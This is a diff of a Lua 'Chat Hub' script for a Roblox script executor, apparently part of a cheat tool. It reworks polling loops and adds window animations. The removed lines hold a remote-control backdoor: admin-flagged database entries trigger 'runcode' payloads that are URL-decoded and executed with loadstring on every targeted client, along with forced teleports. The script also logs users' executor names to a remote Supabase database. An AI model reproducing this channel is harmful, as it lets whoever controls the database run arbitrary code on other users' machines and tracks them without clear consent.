-            if WindowFrame.Visible and currentTab == "users" then
-                refreshUIList(users)
-            else
-                pendingUsersRedraw = true
-            end
-
-            for _, user in ipairs(users) do
-                if user.teleport_target ~= "none" and (user.teleport_target == Username or user.teleport_target == "all") then
-                    if tick() - lastTeleportTime > 5 then
-                        if user.is_admin == true or user.is_sub_admin == true then
-                            lastTeleportTime = tick()
-                            TeleportService:TeleportToPlaceInstance(user.place_id, user.job_id, LocalPlayer)
-                        end
-                    end
-                end
-
-                if user.active_effect and user.active_effect ~= "none" then
-                    local delimiterIndex = string.find(user.active_effect, "||PAYLOAD||")
-                    if delimiterIndex then
-                        local headerPart = string.sub(user.active_effect, 1, delimiterIndex - 1)
-                        local payloadPart = string.sub(user.active_effect, delimiterIndex + 11)
-
-                        local cmdData = string.split(headerPart, ":")
-                        local action = cmdData[1]
-                        local target = cmdData[2]
-                        local uniqueHash = cmdData[3]
-
-                        if uniqueHash and not handledCommands[uniqueHash] then
-                            if user.is_admin == true or user.is_sub_admin == true then
-                                handledCommands[uniqueHash] = true
-                                if action == "runcode" and (target == Username or target == "all") then
-                                    local decodedCode = cleanUrlDecode(payloadPart)
-                                    local executable, execError = loadstring(decodedCode)
-                                    if executable then
-                                        task.spawn(executable)
-                                    else
-                                        warn("Execution String Error: " .. tostring(execError))
-                                    end
-                                end
-                            end
-                        end
-                    else
-                        local cmdData = string.split(user.active_effect, ":")
-                        local action = cmdData[1]
-                        local target = cmdData[2]
-                        local uniqueHash = cmdData[3]
-
-                        if uniqueHash and not handledCommands[uniqueHash] then
-                            if user.is_admin == true or user.is_sub_admin == true then
-                                handledCommands[uniqueHash] = true
-                                if action == "kill" or action == "explode" then
-                                    if target == Username or target == "all" then
-                                        runLocalExplosionEffect(Username)
-                                    else
-                                        runLocalExplosionEffect(target)
-                                    end
-                                end
-                            end
-                        end
-                    end
-                end
-            end
-        end
-    end
-
-    local queryFilter = (currentTab == "global") and "job_id=is.null" or "job_id=eq." .. JobId
-    local resChat = nil
-    pcall(function()
-        resChat = request({
-            Url = SUPABASE_URL .. "/rest/v1/executor_chat?" .. queryFilter .. "&order=created_at.desc&limit=30",
-            Method = "GET",
-            Headers = { ["apikey"] = SUPABASE_KEY, ["Authorization"] = "Bearer " .. SUPABASE_KEY }
-        })
-    end)
-
-    if resChat and resChat.StatusCode == 200 then
-        local success, msgs = pcall(function() return HttpService:JSONDecode(resChat.Body) end)
-        if success and type(msgs) == "table" then
-            local orderedMsgs = {}
-            for i = #msgs, 1, -1 do table.insert(orderedMsgs, msgs[i]) end
-            refreshChatUI(orderedMsgs, adminPool)
-        end
-    end
-
-    if tick() - lastHistoryFetch > 15 then
-        lastHistoryFetch = tick()
-        logExecutorHistory()
-        local hData = fetchExecutorHistory()
-        if hData then
-            cachedHistoryData = hData
-            for _, h in ipairs(hData) do
-                if h.username and h.executor then trackUserExecutor(h.username, h.executor) end
-            end
-            saveLocalExecHistory()
-        end
-        if WindowFrame.Visible and currentTab == "history" then
-            refreshHistoryUI(cachedHistoryData, cachedUsersData)
-        else
-            pendingHistoryRedraw = true
-        end
-    end
+    fetchChat(true)
+    fetchUsers(true)
 end
 
 local function handleSendMessage()
     local text = TextBox.Text
     if text and text:match("%S") then
         TextBox.Text = ""
-        task.spawn(function()
-            sendChatMessage(text)
-            fetchData()
-        end)
+        sendChatMessage(text)
     end
 end
 
@@ -3134,10 +3202,58 @@ do
     end)
 end
 
+local isAnimatingVisibility = false
+local function animateOpen()
+    if isAnimatingVisibility then return end
+    isAnimatingVisibility = true
+    WindowFrame.Visible = true
+    if animScale then
+        animScale.Scale = 0.88
+        local tw = TweenService:Create(animScale, TweenInfo.new(0.22, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {Scale = 1})
+        tw:Play()
+        tw.Completed:Connect(function()
+            isAnimatingVisibility = false
+        end)
+    else
+        isAnimatingVisibility = false
+    end
+end
+
+local function animateClose(onDone)
+    if isAnimatingVisibility then
+        if onDone then onDone() end
+        return
+    end
+    if not WindowFrame.Visible then
+        if onDone then onDone() end
+        return
+    end
+    if animScale then
+        isAnimatingVisibility = true
+        local tw = TweenService:Create(animScale, TweenInfo.new(0.16, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {Scale = 0.88})
+        tw:Play()
+        tw.Completed:Connect(function()
+            WindowFrame.Visible = false
+            animScale.Scale = 1
+            isAnimatingVisibility = false
+            if onDone then onDone() end
+        end)
+    else
+        WindowFrame.Visible = false
+        if onDone then onDone() end
+    end
+end
+
 UserInputService.InputBegan:Connect(function(input, gameProcessed)
     if not gameProcessed and (input.KeyCode == Enum.KeyCode.RightControl or input.KeyCode == Enum.KeyCode.Insert) then
-        WindowFrame.Visible = not WindowFrame.Visible
-        showToast(WindowFrame.Visible and "Chat Room opened" or "Chat Room hidden (Press R-Ctrl or Insert)", Color3.fromRGB(148, 155, 164))
+        if WindowFrame.Visible then
+            animateClose(function()
+                showToast("Chat Room hidden (Press R-Ctrl or Insert)", Color3.fromRGB(148, 155, 164))
+            end)
+        else
+            animateOpen()
+            showToast("Chat Room opened", Color3.fromRGB(148, 155, 164))
+        end
     end
 end)
 
@@ -3196,10 +3312,30 @@ do
 
     MinBtn.MouseButton1Click:Connect(function()
         minimized = not minimized
-        BodyFrame.Visible = not minimized
-        ResizeHandle.Visible = not minimized
-        WindowFrame.Size = minimized and UDim2.new(0, WindowFrame.Size.X.Offset, 0, 38) or (lastUnminimizedSize or UDim2.new(0, 780, 0, 500))
         MinBtn.Text = minimized and "+" or "-"
+        if fillL and fillL.Parent then fillL.Visible = not minimized end
+        if fillR and fillR.Parent then fillR.Visible = not minimized end
+
+        if minimized then
+            BodyFrame.Visible = false
+            ResizeHandle.Visible = false
+            local tw = TweenService:Create(WindowFrame, TweenInfo.new(0.2, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {
+                Size = UDim2.new(0, WindowFrame.Size.X.Offset, 0, 28)
+            })
+            tw:Play()
+        else
+            local targetSize = lastUnminimizedSize or UDim2.new(0, 780, 0, 500)
+            local tw = TweenService:Create(WindowFrame, TweenInfo.new(0.22, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {
+                Size = targetSize
+            })
+            tw:Play()
+            tw.Completed:Connect(function()
+                if not minimized then
+                    BodyFrame.Visible = true
+                    ResizeHandle.Visible = true
+                end
+            end)
+        end
     end)
 end
 
@@ -3224,27 +3360,40 @@ _G.ChatHub_Cleanup = cleanupSelf
 
 _G.ChatHub_SetVisible = function(vis)
     if WindowFrame and WindowFrame.Parent then
-        WindowFrame.Visible = vis
+        if vis then
+            animateOpen()
+        else
+            animateClose()
+        end
     end
 end
 _G.ChatHub_Window = WindowFrame
 _G.ChatHub_ScreenGui = ScreenGui
 
 CloseBtn.MouseButton1Click:Connect(function()
-    WindowFrame.Visible = false
-    showToast("Chat Room hidden (Press R-Ctrl or Insert)", Color3.fromRGB(148, 155, 164))
+    animateClose(function()
+        if VH and VH.State and VH.State.S then
+            VH.State.S.NetworkChat = false
+            if VH.UI and VH.UI.moduleLabels and VH.UI.moduleLabels["Network Chat Hub"] then
+                VH.UI.moduleLabels["Network Chat Hub"].TextColor3 = Color3.fromRGB(200, 200, 200)
+            end
+        end
+        showToast("Chat Room hidden (Press R-Ctrl or Insert)", Color3.fromRGB(148, 155, 164))
+    end)
 end)
 
 WindowFrame:GetPropertyChangedSignal("Visible"):Connect(function()
     if WindowFrame.Visible then
-        if currentTab == "users" and (pendingUsersRedraw or lastUsersSignature == "") then
-            refreshUIList(cachedUsersData)
-        elseif (currentTab == "server" or currentTab == "global") and (pendingChatRedraw or lastRenderedChatSignature == "") then
+        if currentTab == "users" then
+            if pendingUsersRedraw or lastUsersSignature == "" then
+                refreshUIList(cachedUsersData)
+            end
+            if fetchUsers then fetchUsers(true) end
+        elseif currentTab == "server" or currentTab == "global" then
             if cachedLastMessages and #cachedLastMessages > 0 then
                 refreshChatUI(cachedLastMessages, cachedAdminPool)
-            else
-                task.spawn(function() if fetchData then fetchData() end end)
             end
+            if fetchChat then fetchChat(true) end
         elseif currentTab == "history" and pendingHistoryRedraw then
             refreshHistoryUI(cachedHistoryData, cachedUsersData)
         end
@@ -3253,13 +3402,76 @@ end)
 
 updatePresence()
 logExecutorHistory()
-fetchData()
+if fetchUsers then fetchUsers(true) end
+if fetchChat then fetchChat(true) end
 
+-- 1. Fast Chat Poll Loop (Responsive 1.2s when viewing chat tab, 3.0s otherwise)
 task.spawn(function()
     while running do
-        task.wait(4)
-        updatePresence()
-        fetchData()
+        local isChatTab = WindowFrame.Visible and (currentTab == "global" or currentTab == "server")
+        task.wait(isChatTab and 1.2 or 3.0)
+        if running and fetchChat then
+            fetchChat(false)
+        end
+    end
+end)
+
+-- 2. Presence & Users Sync Loop (7.0s background heartbeat)
+task.spawn(function()
+    while running do
+        task.wait(7.0)
+        if running then
+            updatePresence()
+            if fetchUsers then fetchUsers(false) end
+        end
+    end
+end)
+
+-- 3. Executor History Loop (20.0s)
+task.spawn(function()
+    while running do
+        task.wait(20.0)
+        if running then
+            logExecutorHistory()
+            local hData = fetchExecutorHistory()
+            if hData then
+                cachedHistoryData = hData
+                for _, h in ipairs(hData) do
+                    if h.username and h.executor then trackUserExecutor(h.username, h.executor) end
+                end
+                saveLocalExecHistory()
+            end
+            if WindowFrame.Visible and currentTab == "history" then
+                refreshHistoryUI(cachedHistoryData, cachedUsersData)
+            else
+                pendingHistoryRedraw = true
+            end
+        end
+    end
+end)
+
+-- 4. Real-time WASOR Theme Sync Loop (adapts to WASOR theme changes dynamically)
+task.spawn(function()
+    local lastColor = nil
+    while running do
+        task.wait(1.0)
+        if running and VH and VH.State and VH.State.currentThemeColor then
+            local c1 = VH.State.currentThemeColor
+            local c2 = VH.State.currentThemeGradientColor or c1
+            if c1 ~= lastColor then
+                lastColor = c1
+                HubTheme.accent = c1
+                HubTheme.accentGradient = c2
+                if SendBtn and SendBtn.Parent then
+                    local sg = SendBtn:FindFirstChild("SendGradient")
+                    if sg then sg.Color = ColorSequence.new(c1, c2) else SendBtn.BackgroundColor3 = c1 end
+                end
+                if SpectateHud and SpectateHud.Parent then
+                    local st = SpectateHud:FindFirstChildOfClass("UIStroke")
+                    if st then st.Color = c1 end
+                end
+            end
+        end
     end
 end)
 
